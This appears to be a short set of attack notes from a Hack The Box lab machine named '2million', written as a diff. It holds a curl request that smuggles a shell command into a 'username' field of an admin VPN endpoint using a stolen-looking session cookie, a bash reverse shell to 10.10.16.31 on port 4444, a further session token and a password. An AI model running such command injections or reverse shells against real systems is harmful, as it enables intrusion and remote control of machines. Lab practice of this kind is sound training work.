@@ -1,0 +1,10 @@
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=sfo60hudes8ngkq0bfed42vis0" --header "Content-Type: application/json" --data
+'{"username":"test;id;"}'
+
+bash -i >& /dev/tcp/10.10.16.31/4444 0>&1
+
+
+halcvi11t97ff4jvpdl41gsvk3
+
+SuperDuperPass123
